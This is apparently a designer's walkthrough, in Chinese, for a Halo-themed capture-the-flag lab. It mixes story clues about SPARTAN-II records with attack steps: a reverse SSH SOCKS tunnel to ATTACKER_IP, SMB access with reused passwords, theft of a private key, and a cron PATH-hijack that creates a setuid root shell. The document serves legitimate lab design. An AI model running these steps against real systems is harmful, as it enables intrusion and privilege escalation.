真相的核心層。SPARTAN-II 名稱、flash-clone、augmentation、Halsey 書信片段都在這裡——這是一個重大世界觀 reveal，**但不是遊戲的最終答案**。玩家必須自己從好幾份不同來源拼出全貌，沒有單一「THE_TRUTH.txt」，而且拼出 SPARTAN-II 之後應該立刻意識到：這仍然沒有回答 LONGSHORE 開場真正問的問題——誰在 2547 年重新碰過 Farrow 的案件、為什麼。

### 4.1 Pivot 進入（從 relay 內部）
archive 沒有映射任何 port 到宿主機，而且跟 relay 不一樣，archive **只在 internal network 上**——frontier 完全碰不到它，只有 relay 是 dual-homed、真正橋接兩邊。但 relay 本身沒裝 `smbclient`，SMB/HTTP 這些操作還是得用攻擊機自己裝好的工具，所以這裡真正需要的不是單純轉發，是把攻擊機自己接進 internal network：在已經拿到的 relay shell（3.1 節，frontier pivot 進來的）裡，開一個反向 dynamic SOCKS 轉發，回打到攻擊機自己的 sshd：
```bash
# relay 本身有到攻擊機的正常出站路由（跟 frontier reverse shell 那條路一樣，
# 都是 docker bridge 的一般 NAT 出站，不需要額外開洞），
# 所以可以直接從 relay 的 shell 反向連回攻擊機：
ssh -R 1080 <攻擊機自己的帳號>@ATTACKER_IP -N
# 攻擊機這邊要先確保自己有在跑 sshd，帳密用攻擊機自己的即可
```
這樣攻擊機本機的 `127.0.0.1:1080` 就是一個 SOCKS 代理，背後走的是 relay 的網路視角（含 relay 能直連的 internal 網段）。接下來攻擊機自己的工具都透過 `proxychains4`（設定檔指向 `socks5 127.0.0.1 1080`）打：
```bash
proxychains4 smbclient -L //cairn.internal/ -U sysadmin%admin123 -m NT1
proxychains4 curl http://cairn.internal:8080/
```
（也可以用 relay 上的 socat 自己搭別的轉發方式，這是保留給玩家自己選工具的部分——重點是 archive 完全隔離在 internal network，任何方法都得先真正落地在 relay 的執行環境裡才能出得去。）

### 4.2 SMB（445，reuse `sysadmin/admin123`）
```bash
proxychains4 smbclient -L //cairn.internal/ -U sysadmin%admin123 -m NT1
# public / confidential / backups
```

**`public`**（guest 可讀寫，不需要密碼）：`welcome.txt`、`it_policy_reminder.txt`、`meeting_notes_disposition_q1.txt`、`records_retention_schedule.txt`、`regional_chat_export.txt`。後兩份是這輪新加的：
- `records_retention_schedule.txt` — **帶線索，但要小心不要跟 root 文件的機制講反**。這份文件講兩件事：(1) 一般結案案件 30 年後會被標記進銷毀複審——Eli/Wren 這類 2517 年結案的案件，30 年後正好落在 2547 年，SPINDLE migration 前後那波「舊案件突然被重新翻出來」的行政活動有一部分就是這個常規複審造成的；(2) 但**disposition-hold 記錄（Farrow/07-B 那份低溫懸置單位）明文排除在常規複審排程之外**，只有在「持有系統本身被除役/遷移時」才會一併被拉出來做保管狀態複查——這句話才是真正對應 root 文件講的「SPINDLE 除役的標準檔案檢查把 07-B 列入審查清單」，不要讓玩家（或自己）誤以為是同一個 30 年排程機制觸發的，兩者是平行但不同的觸發路徑，只是剛好都落在 2547 年。
- `regional_chat_export.txt` — 純填充，兩個跟劇情完全無關的基層行政互相閒聊，帶一句「這個 case number 很怪」的路人視角，純粹訊噪比用。

**`confidential`**（限定 `valid users = sysadmin`）：
```bash
proxychains4 smbclient //cairn.internal/confidential -U sysadmin%admin123 -m NT1 \
  -c "get acquisition_directive_excerpt.txt; get acquisition_directive_scan.pdf; get disposition_order_2547-014.pdf; get legacy_service_credentials.txt; get cairn_backup_key; \
      get cairn_access_log_extract.txt; get petrov_i_performance_review_2518.txt"
```
- `acquisition_directive_excerpt.txt` / `acquisition_directive_scan.pdf`（掃描版）— **SPARTAN-II 名稱正式出現**的地方：2517 年的徵召指令，說明動機是「殖民地叛亂風險」而不是為了打星盟。
- `disposition_order_2547-014.pdf` — Cmdr. Petrov 簽署的正式處置令掃描版，跟 admin panel record 101 的內容是同一份文件的兩種呈現（一份是 web app 內文字，一份是真正的簽署掃描件），互相印證。
- `legacy_service_credentials.txt` — 四組 base 帳密清單，第三次驗證同一批密碼。
- `cairn_backup_key` — **真的 RSA 私鑰，主線必要**。這是拿到 archive 本機 shell 的唯一方式，見下方 4.2b。
- `cairn_access_log_extract.txt` — **帶線索**。CAIRN 存取紀錄片段，只列時間戳跟動作，不解釋原因：`i.petrov` 在 2547-02-11 10:03 先 `RECORD_VIEW` 了 106（Farrow 的低溫轉移授權），10:19 對「07-B」做了一筆 `CUSTODY_STATUS_SET`——**注意這裡動的是一個獨立的保管狀態欄位，不是 106 這份文件本身的內容**，跟 root 文件講的「保管狀態被私自改掉，三份矛盾來源本身沒有被動過」完全對得上，不要寫成他改了 106 的文字內容。時間點跟 disposition order 101 同一天。不解答「為什麼」，只證明「他那天確實碰過那個欄位」，把 root 文件的答案佐證得更扎實，但不提前劇透。
- `petrov_i_performance_review_2518.txt` — 純填充。刻意寫得平淡稱職，呼應「不要把 ONI 寫成卡通反派」的設計要求。

### 4.2b 用找到的 key 拿 archive 本機 shell

這台的 sshd 被獨立加固過：`PasswordAuthentication no`，`sysadmin/admin123` 對 SSH **完全無效**（Samba 不受影響，繼續吃這組密碼）——這是刻意設計，逼玩家不能單純密碼重用就跳過整個 Act III 直接拿 shell 提權。真正能登入的是上面 SMB confidential share 裡那把 `cairn_backup_key`：
```bash
chmod 600 cairn_backup_key
proxychains4 ssh -i cairn_backup_key sysadmin@cairn.internal
```
（走 4.1 節已經建立好的那條反向 SOCKS 隧道——`cairn_backup_key` 本身就是從那條隧道下載下來的，同一條路直接拿來 ssh 即可，不需要另外開一個 jump host；也可以把這把 key 傳進 relay 的 shell，直接從那裡 `ssh -i cairn_backup_key sysadmin@cairn.internal`，因為 relay 本身就有到 archive 的直接路由。）拿到這個 shell 之後才能做 4.6 的本機提權——`sudo -l`、`id`、`/etc/crontab` 這些 enumeration 都要在這個 shell 裡做，不是在 relay 的 shell 裡。

**`backups`**（guest 可讀寫，操作失誤留下的東西）：
```bash
proxychains4 smbclient //cairn.internal/backups -U sysadmin%admin123 -m NT1 \
  -c "get casualty_log_partial.txt; get training_roster_fragment.txt; get old_budget_q3_2546.txt; \
      get dependent_notification_fragment.txt; get n.okafor_badge_photo.jpg; \
      get kade_m_separation_summary.txt; get castel_m_leave_record_2517.txt; get foia_review_2553.txt"
```
- `kade_m_separation_summary.txt` / `castel_m_leave_record_2517.txt` — 純填充人事資料，時間點跟兩人既有的角色設定對得上（Castel 的假剛好接在 2517 年徵召期之後），但不需要新台詞就有效果。
- `foia_review_2553.txt` — **帶線索，Naomi Okafor optional evidence chain 的延伸**。2553 年 N. Okafor 本人（Eli 的監護人身份）曾經走正規管道申請調閱 Eli 的完整案件資料，被 Compliance 官員 S. Andrade 引用 Disposition Order 2547-014 駁回；備註裡 Compliance 官員自己也注意到「這個名字跟 2547 年那個臨時協助遷移的人員同名」但判定無關——這解釋了 LONGSHORE 為什麼最後選擇找玩家這種非正規管道（她已經試過正規申請，行不通），也是系統內部「差一點自己就發現了」的呼應。
- `casualty_log_partial.txt` — 四個候選人的 augmentation 結果（死亡/殘障/現役），第一次把 Act I/II 的名字跟「augmentation」這個詞連起來。
- `training_roster_fragment.txt` — **只給訓練代號 + 殖民地 + 年齡，不給姓名**，見 4.4 節。
- `dependent_notification_fragment.txt` — 一份不該留在這個分享的次要送達紀錄殘存片段，指出 Eli Okafor 的通知送達對象是「Naomi Okafor, parent/guardian of record」——這是 LONGSHORE = Naomi Okafor 這條 optional evidence chain 的其中一環，見 `truth-map.md`。
- `n.okafor_badge_photo.jpg` — 一張員工識別證照片，跟 relay `system_migration_log` 裡「Processed by: N. Okafor, Colonial Records Clerk」那筆紀錄對得上，也剛好跟同一個分享夾裡 `dependent_notification_fragment.txt` 提到的監護人同名同姓。純粹是「這張照片剛好也在這個備份資料夾裡」的巧合擺放，沒有任何文字說明特別指出兩者是同一人——玩家自己要注意到名字重複。這是刻意加強 Naomi Okafor 身份線索真實感的素材，不是必經節點。
- `old_budget_q3_2546.txt` — 純填充，一份過季的預算摘要，跟劇情完全無關，放著只是因為「備份資料夾裡通常什麼都有」。

### 4.3 登入 CAIRN Records Terminal（8080）

用 3.3b 節從 `sync.conf` 找到的 `administrator / Records!Access99` 登入：
```bash
proxychains4 curl -i -c cairn_cookies.txt -X POST http://cairn.internal:8080/login --data "username=administrator&password=Records!Access99"
# 302 -> /dashboard，回應帶 Set-Cookie: cairn_session=<token>
```
（第十三輪移除：這個登入原本還有一條 SQL injection 的替代路徑——`username` 欄位在一次 pentest finding 後被 strip 掉單引號/`--`，但同一條 f-string 組出來的查詢在 `password` 欄位完全沒有動過，換欄位就能繞過去。跟合法帳密拿到的是完全一樣的 session/dashboard，兩條路是純粹的「拿到同一個東西」，已經改成參數化查詢把 SQLi 徹底修掉，只留合法帳密這一條——這條本身就是主線必經，跟 3.3b 節的 credential discovery 直接掛鉤，不是捷徑。）

**`/dashboard`、`/records/*` 現在有真的 session 檢查**（`admin_panel.py` 的 `VALID_SESSIONS`/`has_valid_session`），沒帶登入時拿到的 `cairn_session` cookie 一律 302 回首頁——**一定要用 `-b` 帶上面 `-c` 存下來的 cookie**，不能像沒有這個檢查時那樣直接裸 curl：
```bash
proxychains4 curl -b cairn_cookies.txt http://cairn.internal:8080/dashboard
# 列出 [101]~[106] 六份文件
```
| # | 標題 | 內容重點 |
|---|---|---|
| 101 | ONI Section III - Disposition Order 2547-014 | 解釋 LEDGER/CAIRN 為什麼分兩層；Cmdr. Petrov 的正式授權；**註明這個節點只是待轉移的 staging mirror**，不是現役最高機密資料中心（解釋了為什麼這台機器資安這麼糟） |
| 102 | Flash-Clone Substitution Protocol - Medical Annex | 掩蓋機制本身；Dr. Castel 自白「我事後審核簽核了三份」（她是計畫端醫療督導，不是到場簽署死亡證明的人——實際簽署人是各殖民地當地醫師） |
| 103 | Correspondence Fragment - C. Halsey to Section III, 2517 | 道德複雜性，不是反派台詞 |
| 104 | Internal Memo - CPO M. Kade to Records, 2540 | 訓練者的矛盾情感 + 追加的「07-B」線索（見 4.4） |
| 105 | Medical Certification Log Fragment | 解答 102 的「三份 vs 四筆案件」落差 |
| 106 | Cryogenic Recovery Transfer Authorization - Subject 07-B | Farrow 矛盾的第三個來源（見 4.5） |

101/102/104/105 這四份文件掛有真實人物照片（Cmdr. I. Petrov / Dr. M. Castel / CPO M. Kade / Dr. R. Achebe，`RECORD_PHOTOS` dict），103 跟 106 刻意不給照片——不是遺漏，是因為 103 是書信片段、106 是轉移授權書，這兩種文件類型本來就不會附照片，跟其他文件的照片一起看才會覺得「有些文件有照片、有些沒有」是正常的，而不是「系統只做了一半」。

### 4.4 【推理節點 1】三份 vs 四筆
102 說 Castel「事後審核簽核了三份」案件檔案，但玩家在 Act II 已經看過**四筆**帶 `transfer_ref` 異常的案件（Okafor / Wren / Farrow / Voight）。這個落差不會自動被指出來——玩家要自己數。

答案在 105（現在是三欄：案件編號 / 當地簽署醫師 / ONI 檔案審核——當地醫師才是實際簽署死亡證明的人，完全不知情；ONI 端的審核簽核人才是 Castel/Achebe 的落差所在）：
```
案件編號         當地簽署醫師                ONI 檔案審核
OCPA-R4-11902   Dr. H. Idowu（Eridanus II）  M. Castel
OCPA-R4-11944   Dr. A. Petrides（Madrigal）  M. Castel
OCPA-R4-11887   Dr. T. Marlow（Skopje）      M. Castel
OCPA-R4-10733   Dr. H. Idowu（Eridanus II）  R. Achebe   <- 第四份 ONI 端審核是別人
```
意義：涉入這件事的 ONI 端醫療人員不只 Castel 一個；當地簽署醫師則完全是各殖民地不知情的一般醫師，跟 ONI 端的審核是兩層不同的人。

### 4.5 【推理節點 2】代號還原真名，兩份來源互相矛盾
104 的追加段落只用訓練代號「07-B」講一段親眼所見，暗示他其實死在強化手術中：
> "07-B. Skopje kid, angriest six-year-old I ever met... The official log on that one reads as a medical discharge. That is not what I watched happen... I did not write it up that way."

`training_roster_fragment.txt`：
```
07-A  Eridanus II  6
07-B  Skopje       6
07-C  Madrigal     6
07-D  Eridanus II  7
```
Skopje 只有一筆案例 → 07-B = Dominic Farrow（`OCPA-R4-11887`）。但 `casualty_log_partial.txt` 明明寫 Farrow 是「discharged, permanent disability」——跟 Kade 的說法直接矛盾。

### 4.5b 【推理節點 3】第三個來源，矛盾升級成真正的 forensic ambiguity
CAIRN record 106（Cryogenic Recovery Transfer Authorization - Subject 07-B）又給出第三種說法：他當時被判定「臨床上無法存活」，轉入低溫懸置，之後沒有追蹤紀錄。

三份來源現在是：
1. 官方 casualty log：殘障、除役。
2. Kade：親眼看到他死。
3. 醫療轉移授權：臨床無法存活、轉入懸置、後續不明。

**遊戲永遠不裁決哪個是真的，任何文件都不會給答案。** 這是刻意設計成「多份可信來源互相矛盾」的節點，玩家自己決定要信哪一個，或者接受它本來就沒有乾淨答案。

### 4.6 本機提權（PATH hijack via cron，root）— 需要幾步 enumeration，不是單一 misconfig

```bash
cat /etc/crontab
# PATH=/opt/staging:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
# * * * * * root /opt/healthcheck.sh

ls -la /opt/healthcheck.sh        # -rwxr-x--- root release  (讀得到,寫不到)
cat /opt/healthcheck.sh
# #!/bin/bash
# logtool "Health check: $(date)" >> /var/log/health.log

id sysadmin                       # sysadmin 是 release 群組成員
ls -la /opt/staging               # drwxrwxr-x root release  <- release 群組可寫
```

推理鏈：cron 用 root 執行 `/opt/healthcheck.sh` → 腳本本身讀得到但寫不到（root:release 750）→ 腳本內部呼叫的 `logtool` 沒有寫絕對路徑 → root 的 crontab 把 `/opt/staging` 排在系統目錄**前面** → `sysadmin` 剛好是 `release` 群組成員，而 `/opt/staging` 對這個群組可寫 → 在 `/opt/staging` 放一個叫 `logtool` 的檔案，等 root cron 在 60 秒內以 root 身份執行它。**這個群組刻意不叫 `deploy`**：base image 本來就有一個叫 `deploy` 的帳號，如果沿用同名群組，那個帳號會透過自己的 primary group 白撿到同樣的寫入權限，變成一條意外的、不需要 enumerate 就能走的捷徑：
```bash
cat > /opt/staging/logtool << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod u+s /tmp/rootbash
EOF
chmod +x /opt/staging/logtool
# 等一分鐘
/tmp/rootbash -p
```
（`logtool` 這個名字在系統上任何標準 PATH 目錄都不存在——這個 healthcheck job 從部署以來其實一直在默默失敗，不是刻意留的提示字串，是舊 rollout 沒清乾淨的殘留。）

### 4.7 最終證據（root only）
```bash
cat /root/cairn_disposition_review.txt
```
檔名刻意取成跟其他 CAIRN 文件一致的風格（不叫 `final_*`）。**內容不重講整個陰謀**——acquisition、flash-clone、augmentation 結果玩家此時應該已經自己拼出來了，SPARTAN-II 這個名稱在 4.3 節就已經正式揭露。這份文件回答的是 LONGSHORE 真正委託的具體問題：SPINDLE 除役檔案檢查把 Farrow（07-B）的低溫懸置單位列入審查清單時，Petrov 在正式審查觸發前私自把保管狀態改成「繼續、無需處理」，未經授權跳過審查——這就是「30 年前的死亡紀錄為什麼在 2547 年被重新處理過」的答案，也是玩家從 Act I 就在追的 transfer_ref 異常真正成因。文件依然**不解答**07-B 是否存活，三方矛盾（casualty log／Kade／低溫轉移授權）永遠沒有標準答案。是最後一塊拼圖，不是一張把全部劇情倒出來的答案卷。

---

## 附錄 A：三台 host 各自的提權路徑（完整列表）

| Host | 立足點 | 提權 |
|---|---|---|
| frontier | upload（getimagesize magic-byte bypass，www-data） | 無。root 在這台解鎖不了任何東西，第十三輪把 `sudo -l` NOPASSWD find 跟 `/opt/backup.sh` 群組寫入兩條「打得到但沒有回報」的路都移除了，不留兔子洞 |
| relay | SSH 密碼重用（sysadmin） | 無。理由同上，第十三輪移除了 SUID `spindle-legacy-diag` |
| archive | 合法帳密（`administrator/Records!Access99`）/ SMB 都能直接拿到大部分內容。**但要 shell（提權必要）就只有一條路**：SMB confidential share 裡的 `cairn_backup_key`，SSH 密碼認證在這台被關掉了（`sysadmin/admin123` 對 SSH 完全無效，只有 Samba 還吃這組密碼）——這是刻意設計，避免密碼重用直接跳過整個 Act III 拿 shell | PATH hijack：cron 用 root 執行 `/opt/healthcheck.sh`（讀得到寫不到），腳本呼叫未寫絕對路徑的 `logtool`，root crontab 的 `PATH=` 把 `/opt/staging` 排在前面且對 `release` 群組（`sysadmin` 是成員）可寫 —— **這是主線最終提權，需要多步 enumeration，不是單一 GTFOBins/world-writable 捷徑**（群組刻意不叫 `deploy`，避免跟 base image 既有的 `deploy` 帳號的 primary group 撞名） |

## 附錄 B：每一組密碼的「合法發現管道」（不需要 brute force）

| 密碼 | 發現管道 |
|---|---|
| `sysadmin/admin123`（webmail + relay SSH + archive SMB） | frontier `/notes/` 目錄列出的兩份文件合起來：`credential_rotation_status.txt`（哪個帳號還沒輪替：`sysadmin`）+ `welcome.txt`（範本預設密碼是什麼：`admin123`） |
| `root/S3cretDB!2024`（relay MariaDB） | frontier webmail inbox 第二封信；relay `service_accounts` 沒有這筆但 MariaDB 連線本身就是憑證來源 |
| CAIRN Fileshare 帳密 | relay MariaDB `service_accounts` 表（密碼重用印證） |
| CAIRN Records Terminal 帳密 | relay 檔案系統 `/etc/ledger/sync.conf`（呼應 API record id 5） |

## 附錄 C：完整時間軸 / 真相

遊戲現在時間點：**2555 年**。見 `timeline.md`、`truth-map.md`。簡述：SPARTAN-II 代號 2513 年起就在 Section III 內部小規模使用 → 2516 年殖民地叛亂風險推估把它推向全面徵召 → 2517 年正式 Candidate Acquisition Directive 發出（候選人徵召時約 6 歲）→ 用 flash-clone 掩蓋兒童失蹤（當地醫師簽署死亡證明，Castel 在 ONI 端事後審核）→ Reach 訓練（Chief Mendez 主持，CPO Kade 是麾下訓練幹部之一）+ 2525 年 augmentation（死傷不一，Farrow 的結局有三份互相矛盾的來源，永遠不解答）→ 這批人至少從 2547 年起就已經是公開的英雄形象（UNSC 拿來做宣傳），2552 年戰爭結束後只是形象更普及，起源持續保密 → 2547 年舊系統 SPINDLE 退役，資料分流進 LEDGER（一般）與待轉移的 CAIRN staging mirror（機密），Petrov 正式授權整批資料「保留但不公開」，**同一時間他私自把 Farrow/07-B 的低溫懸置單位保管狀態改成「繼續、無需處理」，未經授權跳過了本該觸發的正式審查——這是遊戲真正的終局答案，不是 SPARTAN-II 本身** → LONGSHORE（Naomi Okafor）恰好在同一批 migration 中處理鄰近案件時意外發現 Eli 的異常，又找到一份顯示 Farrow 案在結案數十年後被重新處理過的 index 殘存片段，花約 8 年查證後於 2555 年聯絡玩家，要求玩家查出「誰動了 Farrow 的檔案、為什麼」。
